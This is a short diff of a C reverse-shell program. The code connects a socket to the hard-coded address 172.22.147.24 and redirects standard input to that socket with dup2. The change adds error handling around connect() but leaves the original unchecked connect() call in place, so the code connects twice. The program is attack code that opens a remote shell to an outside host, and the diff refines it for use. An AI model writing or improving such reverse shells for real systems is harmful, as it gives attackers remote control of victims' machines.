@@ -17,6 +17,12 @@ int main(void){
     revsockaddr.sin_port = htons(port);
     revsockaddr.sin_addr.s_addr = inet_addr("172.22.147.24");
 
+    if (connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)) < 0) {
+    perror("connect failed");
+    close(sockt);
+    exit(EXIT_FAILURE);
+    }
+
     connect(sockt, (struct sockaddr *) &revsockaddr, 
     sizeof(revsockaddr));
     dup2(sockt, 0);
